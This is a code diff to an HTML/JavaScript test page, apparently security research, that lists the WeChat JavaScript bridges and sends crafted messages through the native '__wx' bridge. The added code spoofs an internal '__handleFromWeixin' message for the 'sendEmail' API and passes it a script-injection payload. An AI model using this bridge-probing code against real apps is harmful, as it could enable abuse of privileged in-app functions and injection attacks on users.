@@ -22,6 +22,35 @@
 		//}
 	</script>
 	<script>
+	var _callback_count = 1000;
+	var _MESSAGE_TYPE = '__msg_type';
+	var _CALLBACK_ID = '__callback_id';
+    var _EVENT_ID = '__event_id';
+
+	function _sendMessage(msg) {
+	    var msgArray = []; msgArray.push(msg);
+	    var msgArrayString = JSON.stringify(msgArray);
+	    __wx._sendMessage(msgArrayString);
+	}
+
+	function _call(func, params, callback) {	    
+	    if (typeof params !== 'object') {
+	      params = {};
+	    };
+
+	    var callbackID = (_callback_count++).toString();
+
+	    var msgObj = {
+	      'func': func,
+	      'params': params
+	    };
+
+	    msgObj[_MESSAGE_TYPE] = 'call';
+	    msgObj[_CALLBACK_ID] = callbackID;
+	    
+	    _sendMessage(JSON.stringify(msgObj));	    
+  	}
+
   	window.addEventListener('load', function(event) {  		
   		mylog("[+] Printing Javascript-bridges available");
   		if(typeof window.WeixinJSBridge !== 'undefined') mylog('WeixinJSBridge');
@@ -37,7 +66,15 @@
 			mylog('setSearchInputWord test');
 
 			var msg_array = new Array();
+			
+			_sendMessage(JSON.stringify({
+          		'__handleFromWeixin': 'hahaha',
+          		'__fullApiName': 'sendEmail'
+        	}));
 
+        	_call('sendEmail', "<script>alert(1);<\/script>");
+        	
+        	/*
 			msg_array[0] = JSON.stringify({
 				"func":"getSearchData",
 				"params":{
@@ -132,7 +169,8 @@
 				var msgArray = []; msgArray.push(msg_array[i]);
 				var msgArrayString = JSON.stringify(msgArray);
 				window.__wx._sendMessage(msgArrayString);
-			}			
+			}
+			*/
 		}    	
   	});
   </script>
